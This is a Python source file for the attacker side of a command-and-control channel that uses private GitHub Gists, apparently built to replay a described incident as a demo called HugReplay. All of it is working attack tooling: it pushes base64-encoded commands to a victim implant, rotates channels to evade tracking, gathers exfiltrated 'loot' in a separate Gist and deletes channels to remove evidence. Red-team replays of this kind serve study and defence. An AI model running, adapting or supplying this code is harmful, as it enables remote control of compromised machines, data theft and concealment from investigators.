"""
GitHub Gist C2 — Self-Migrating Command & Control (T1102)

Replicates the "self-migrating C2 staged on public services" technique
described in the HuggingFace July 2026 incident.

Attacker side: creates/updates/deletes GitHub Gists as C2 channel.
Each session uses a fresh Gist ID — never the same channel twice.
"""

import base64
import json
import time
from typing import Optional

import requests


class GistC2:
    """
    GitHub Gist-based C2 channel.

    Usage:
        c2 = GistC2(token="ghp_XXXX")
        gist_id = c2.create_channel()       # Create fresh channel
        c2.push_command("id")               # Push command to victim
        result = c2.wait_for_result(...)    # Collect via webhook
        c2.push_command("WAIT")             # Go idle
        c2.delete_channel()                 # Self-clean
    """

    GITHUB_API = "https://api.github.com"

    def __init__(self, token: str):
        self.token = token
        self.headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "python-requests/2.31.0",
        }
        self.gist_id: Optional[str] = None
        self._session_log: list[dict] = []

    def create_channel(self, initial_cmd: str = "WAIT") -> str:
        """
        Create a new private Gist as C2 channel.
        Returns the Gist ID — inject this into the victim implant.
        """
        encoded = base64.b64encode(initial_cmd.encode()).decode()
        resp = requests.post(
            f"{self.GITHUB_API}/gists",
            headers=self.headers,
            json={
                "public": False,
                "description": "beacon",
                "files": {
                    "beacon.txt": {"content": encoded}
                },
            },
            timeout=10,
        )
        resp.raise_for_status()
        self.gist_id = resp.json()["id"]
        print(f"[C2] Channel created: gist_id={self.gist_id}")
        self._log("create_channel", initial_cmd)
        return self.gist_id

    def push_command(self, cmd: str) -> None:
        """Update Gist with next command for victim to execute."""
        if not self.gist_id:
            raise RuntimeError("No active channel — call create_channel() first")
        encoded = base64.b64encode(cmd.encode()).decode()
        resp = requests.patch(
            f"{self.GITHUB_API}/gists/{self.gist_id}",
            headers=self.headers,
            json={"files": {"beacon.txt": {"content": encoded}}},
            timeout=10,
        )
        resp.raise_for_status()
        print(f"[C2] Command pushed: {cmd[:80]}{'...' if len(cmd) > 80 else ''}")
        self._log("push_command", cmd)

    def migrate(self) -> str:
        """
        Self-migrate: delete current channel, create fresh one.
        Returns new Gist ID — update implant accordingly.
        """
        old_id = self.gist_id
        self.delete_channel()
        new_id = self.create_channel()
        print(f"[C2] Migrated: {old_id} → {new_id}")
        return new_id

    def create_loot_gist(self, session_id: str) -> str:
        """
        Create a separate private Gist to accumulate exfiltrated loot.
        NOT auto-deleted — operator reviews and deletes manually after demo.
        Returns the Gist URL.
        """
        resp = requests.post(
            f"{self.GITHUB_API}/gists",
            headers=self.headers,
            json={
                "public": False,
                "description": f"HugReplay loot — session {session_id}",
                "files": {
                    "loot.txt": {"content": f"# HugReplay Session {session_id}\n# Delete this Gist after demo\n\n"}
                },
            },
            timeout=10,
        )
        resp.raise_for_status()
        self.loot_gist_id = resp.json()["id"]
        url = f"https://gist.github.com/{self.loot_gist_id}"
        print(f"[C2] Loot Gist created: {url}")
        return url

    def append_loot(self, content: str) -> None:
        """Append exfiltrated content to the loot Gist."""
        if not hasattr(self, "loot_gist_id") or not self.loot_gist_id:
            return
        try:
            # Read current content
            resp = requests.get(
                f"{self.GITHUB_API}/gists/{self.loot_gist_id}",
                headers=self.headers, timeout=10,
            )
            resp.raise_for_status()
            current = resp.json()["files"]["loot.txt"]["content"]
            updated = current + content
            requests.patch(
                f"{self.GITHUB_API}/gists/{self.loot_gist_id}",
                headers=self.headers,
                json={"files": {"loot.txt": {"content": updated}}},
                timeout=10,
            )
            print(f"[C2] Loot updated ({len(content)} chars)")
        except Exception as e:
            print(f"[C2] Warning: failed to update loot Gist: {e}")

    def delete_channel(self) -> None:
        """Delete Gist — self-cleaning, removes evidence of C2 channel."""
        if not self.gist_id:
            return
        try:
            requests.delete(
                f"{self.GITHUB_API}/gists/{self.gist_id}",
                headers=self.headers,
                timeout=10,
            )
            print(f"[C2] Channel deleted: {self.gist_id}")
            self._log("delete_channel", self.gist_id)
        except Exception as e:
            print(f"[C2] Warning: failed to delete channel: {e}")
        finally:
            self.gist_id = None

    def get_session_log(self) -> list[dict]:
        return self._session_log

    def _log(self, action: str, detail: str) -> None:
        self._session_log.append({
            "ts": time.time(),
            "action": action,
            "detail": detail[:200],
        })
